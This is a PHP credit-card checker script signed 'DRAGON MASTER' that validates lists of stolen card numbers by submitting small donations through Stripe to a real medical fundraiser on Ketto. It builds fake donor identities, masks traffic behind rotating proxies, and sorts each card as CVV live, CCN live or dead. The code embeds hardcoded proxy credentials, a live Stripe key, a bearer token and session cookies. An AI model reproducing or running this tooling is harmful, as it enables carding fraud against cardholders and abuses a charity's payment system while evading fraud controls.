<?php

//=============================================================//
//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//



//================[Functions and Variables]================//
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//

//=======================[Proxys]=============================//
$rp1 = array(
  1 => 'allhxpvu-rotate:xksjbgb5y21k', /// [ex :-
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];;


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

//echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ketto.org/api/fundraisers/167947/order');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.ketto.org',
'method: POST',
'path: /api/fundraisers/167947/order',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.5',
'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpcy5rZXR0by5vcmdcL2FwaVwvZnVuZHJhaXNlcnNcLzIxMjY1NVwvY2FydCIsImlhdCI6MTY0Nzk4NDMwOCwiZXhwIjoxNjQ5MTkzOTA4LCJuYmYiOjE2NDc5ODQzMDgsImp0aSI6IkxTdUlNYTRwd05rbFlFZGoiLCJzdWIiOjYwMDc4MDYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.Ro0Q7GaSbRY_7keJiL1ZvMgKBre58p3BC_aULLX8GW4',
'content-type: application/json',
'Cookie: k_utm=eyJ1dG1fc291cmNlIjoiZXh0ZXJuYWxfS2V0dG8iLCJ1dG1fbWVkaXVtIjoiZ29vZ2xlLXNlYXJjaCIsInV0bV90ZXJtIjoiYl8gZG9uYXRlIiwidXRtX2NvbnRlbnQiOiJkb25hdGlvbl9yZXNwX2FkMSIsInV0bV9jYW1wYWlnbiI6IlMxNF83MDAwX1NBTEVfRG9uYXRpb25fS1lfQUxMX0NMS19JTkQiLCJ1dG1fcGxhY2VtZW50IjoiS1QyOF9BR18xODY1X0RvbmF0aW9uX0dlbmVyaWMifQ%3D%3D; ip_location=eyJjb3VudHJ5X2NvZGUiOiJCRCIsImNvdW50cnlfbmFtZSI6IkJhbmdsYWRlc2giLCJyZWdpb25fbmFtZSI6IkRoYWthIiwiemlwX2NvZGUiOiIxMzEyIiwiY2l0eV9uYW1lIjoiRGhha2EifQ%3D%3D; _ku=6d8e39d191072715c435c8b6deb19074; …86guoUBTcACwcj9ynIIxWQ; __stripe_mid=501711e5-49bd-41df-82ea-f8e51f18d63eaae335; _vis_opt_exp_578_goal_1=1; WZRK_S_4R6-478-RR4Z=%7B%22p%22%3A1%2C%22s%22%3A1647986665%2C%22t%22%3A1647986686%7D; _nv_sess=11700203.1647986668.98PD1G88rMGKWuvRnBsJH3bN0gctrf16Qe0UrUX3r6hn55Ws53; _gat_tracker=1; outbrain_cid_fetch=true; _hjIncludedInSessionSample=0; _hjSession_200024=eyJpZCI6IjZlZTU5OTg5LTQyY2UtNDg3Ny04OWQ0LTgxYzYwOTYxMzIzNiIsImNyZWF0ZWQiOjE2NDc5ODY2ODIxOTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1',
'origin: https://www.ketto.org',
'referer: https://www.ketto.org/fundraiser/offer-a-helping-hand-to-support-rohit-sharmas-treatment?donate=true&payment=options',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"campaign_id":167947,"cart_id":11960024,"mode":"CARD","gateway":"ketto","mode_value":"' . $brand . '","bin":"529205","page_type":"campaign","ab_testname":"Prod - Donor Tip A/B","ab_value":"Control","vpa":"","tenure":"","payment_gateway":"","is_indian":"","cause_id":"","donor_pincode":"'.$zip.'","utm_campaign":"S14_7000_SALE_Donation_KY_ALL_CLK_IND","utm_medium":"google-search","utm_source":"external_Ketto","utm_term":"b_ donate","utm_content":"donation_resp_ad1","utm_placement":"KT28_AG_1865_Donation_Generic"}');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: ',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'x-requested-with: XMLHttpRequest',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'time_on_page=1047&guid=NA&muid=501711e5-49bd-41df-82ea-f8e51f18d63eaae335&sid=NA&key=pk_live_LmAKiI3ufRxxsl84CsNkt812&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');

  $result2 = curl_exec($ch);
 $message = trim(strip_tags(getstr($result2,'"message":"','"')));
$token = trim(strip_tags(getstr($result2,'"id":"','"')));

//=======================[2 REQ-END]==============================//

//=======================[3 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ketto.org/api/payment/send');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.ketto.org',
'method: POST',
'path: /api/payment/send',
'scheme: https',
'accept: pplication/json, text/plain, */*',
'accept-language: en-US,en;q=0.5',
'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpcy5rZXR0by5vcmdcL2FwaVwvZnVuZHJhaXNlcnNcLzIxMjY1NVwvY2FydCIsImlhdCI6MTY0Nzk4NDMwOCwiZXhwIjoxNjQ5MTkzOTA4LCJuYmYiOjE2NDc5ODQzMDgsImp0aSI6IkxTdUlNYTRwd05rbFlFZGoiLCJzdWIiOjYwMDc4MDYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.Ro0Q7GaSbRY_7keJiL1ZvMgKBre58p3BC_aULLX8GW4',
'content-type: application/json',
'cookie: k_utm=eyJ1dG1fc291cmNlIjoiZXh0ZXJuYWxfS2V0dG8iLCJ1dG1fbWVkaXVtIjoiZ29vZ2xlLXNlYXJjaCIsInV0bV90ZXJtIjoiYl8gZG9uYXRlIiwidXRtX2NvbnRlbnQiOiJkb25hdGlvbl9yZXNwX2FkMSIsInV0bV9jYW1wYWlnbiI6IlMxNF83MDAwX1NBTEVfRG9uYXRpb25fS1lfQUxMX0NMS19JTkQiLCJ1dG1fcGxhY2VtZW50IjoiS1QyOF9BR18xODY1X0RvbmF0aW9uX0dlbmVyaWMifQ%3D%3D; ip_location=eyJjb3VudHJ5X2NvZGUiOiJCRCIsImNvdW50cnlfbmFtZSI6IkJhbmdsYWRlc2giLCJyZWdpb25fbmFtZSI6IkRoYWthIiwiemlwX2NvZGUiOiIxMzEyIiwiY2l0eV9uYW1lIjoiRGhha2EifQ%3D%3D; _ku=6d8e39d191072715c435c8b6deb19074; …86guoUBTcACwcj9ynIIxWQ; __stripe_mid=501711e5-49bd-41df-82ea-f8e51f18d63eaae335; _vis_opt_exp_578_goal_1=1; WZRK_S_4R6-478-RR4Z=%7B%22p%22%3A1%2C%22s%22%3A1647986665%2C%22t%22%3A1647986719%7D; _nv_sess=11700203.1647986668.98PD1G88rMGKWuvRnBsJH3bN0gctrf16Qe0UrUX3r6hn55Ws53; _gat_tracker=1; outbrain_cid_fetch=true; _hjIncludedInSessionSample=0; _hjSession_200024=eyJpZCI6IjZlZTU5OTg5LTQyY2UtNDg3Ny04OWQ0LTgxYzYwOTYxMzIzNiIsImNyZWF0ZWQiOjE2NDc5ODY2ODIxOTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1',
'origin: https://www.ketto.org',
'referer: https://www.ketto.org/fundraiser/offer-a-helping-hand-to-support-rohit-sharmas-treatment?donate=true&payment=options',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'x-requested-with: XMLHttpRequest',
   ));

# ----------------- [3req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"order_id":"ORD1647988291712712303657","return_url":"https://www.ketto.org/new/payment-route?or=f&id=167947&oi=ORD1647988291712712303657&ct=offer-a-helping-hand-to-support-rohit-sharmas-treatment&pcurrency=USD&cause=Medical&dnr=fs&lpm=strp&last_pay_mode=CARD","token":"'.$token.'","token_1":"","save_card":"","customer_id":null,"account_no":"","ifsc_code":"","bank_code":"","bank_name":""}');
$result3 = curl_exec($ch);
$message = trim(strip_tags(getstr($result3,'"message":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[3 REQ-END]==============================//



//=======================[MADE BY]==============================//

$MADEBY = "[ (🇮🇳)DRAGON MASTER ]";

//[You Have  To Change Name Here Automatically In All Response Will Change ]//

//=======================[MADE BY]==============================//


//=======================[Responses]==============================//

# - [CVV Responses ] - #

if ((strpos($result3, '"cvc_check":"pass"')) || (strpos($result3, "Thank You.")) || (strpos($result3, 'Your card zip code is incorrect.')) || (strpos($result3, "Thank You For Donation.")) || (strpos($result3, "incorrect_zip")) || (strpos($result3, "Success ")) || (strpos($result3, '"type":"one-time"')) || (strpos($result3, "/donations/thank_you?donation_number="))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜  CVV PASS ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result3, "Transaction Failed!! Your card has insufficient funds. Please try again or email us at info@ketto.org if the issue still persists (mention the email or phone number used for this transaction)")) || (strpos($result3, '"cvc_check": "fail"'))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜ R ➜ Your card has insufficient funds.  ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result3, 'security code is incorrect.')) || (strpos($result3, "security code is invalid.")) || (strpos($result3, "Your card's security code is incorrect.")) || (strpos($result3, "incorrect_cvc"))){
    echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';

}
#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result3, 'stolen_card')) || (strpos($result3, "lost_card")) || (strpos($result3, "pickup_card."))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}


# -- [Stolen,Lost,Pickup Responses END ] - #



# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result3, 'Transaction Failed!! Your card was declined. Please try again or email us at info@ketto.org if the issue still persists (mention the email or phone number used for this transaction)')) || (strpos($result1, "generic_decline")) || (strpos($result3, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result3, "processing_error")) || (strpos($result3, "parameter_invalid_empty")) || (strpos($result3, 'lock_timeout')) || (strpos($result3, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result3, 'Payment cannot be processed, missing credit card number')) || (strpos($result3, "missing_payment_information")) || (strpos($result3, 'three_d_secure_redirect')) || (strpos($result3, '"cvc_check": "unchecked"')) || (strpos($result3, "service_not_allowed")) || (strpos($result3, '"cvc_check": "unchecked"')) || (strpos($result3, 'Your card does not support this type of purchase.')) || (strpos($result3, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result3,  'Your card has expired.')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜:  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result3,  'Transaction Failed!! Invalid account. Please try again or email us at info@ketto.org if the issue still persists (mention the email or phone number used for this transaction)')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card number is incorrect. ➜  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
elseif 
(strpos($result3,  '-1')) {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Update Nonce ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

else {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #

//=======================[Responses-END]==============================//


curl_close($ch);
ob_flush();

echo "<b>1REQ Result:</b> $result1<br><br>";
echo "<b>2REQ Result:</b> $result2<br><br>";
echo "<b>3REQ Result:</b> $result3<br><br>";

//=============================================================//
//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//
?>
